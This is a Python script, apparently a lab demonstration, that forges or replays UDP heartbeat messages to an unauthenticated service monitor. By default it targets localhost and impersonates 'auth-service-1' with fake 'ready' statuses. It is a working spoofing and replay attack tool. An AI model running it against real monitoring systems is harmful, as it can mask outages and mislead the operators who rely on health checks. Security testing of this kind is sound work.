#!/usr/bin/env python3
"""Send forged or replayed heartbeats to test the unauthenticated monitor."""

from __future__ import annotations

import argparse
import json
import socket
import time
from datetime import datetime, timezone
from pathlib import Path


def utc_timestamp() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--mode", choices=("spoof", "replay"), default="spoof")
    parser.add_argument("--monitor-host", default="127.0.0.1")
    parser.add_argument("--monitor-port", type=int, default=5051)
    parser.add_argument("--service-id", default="auth-service-1")
    parser.add_argument("--interval", type=float, default=1.0)
    parser.add_argument("--duration", type=float, default=12.0)
    parser.add_argument("--capture-file", type=Path, default=Path("last_heartbeat.json"))
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    destination = (args.monitor_host, args.monitor_port)
    replay_message = None
    if args.mode == "replay":
        replay_message = json.loads(args.capture_file.read_text(encoding="utf-8"))

    sent = 0
    deadline = time.monotonic() + args.duration
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
        print(
            f"{utc_timestamp()} ATTACK starting mode={args.mode} target=udp://{destination[0]}:{destination[1]}",
            flush=True,
        )
        while time.monotonic() < deadline:
            if args.mode == "replay":
                message = replay_message
            else:
                sent += 1
                message = {
                    "type": "HEARTBEAT",
                    "service_id": args.service_id,
                    "sequence": 900000 + sent,
                    "sent_at": utc_timestamp(),
                    "status": "ready",
                }
            encoded = json.dumps(message, separators=(",", ":")).encode("utf-8")
            udp_socket.sendto(encoded, destination)
            print(
                f"{utc_timestamp()} ATTACK injected mode={args.mode} "
                f"sequence={message['sequence']}",
                flush=True,
            )
            if args.mode == "replay":
                sent += 1
            time.sleep(args.interval)
    print(f"{utc_timestamp()} ATTACK complete packets={sent}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
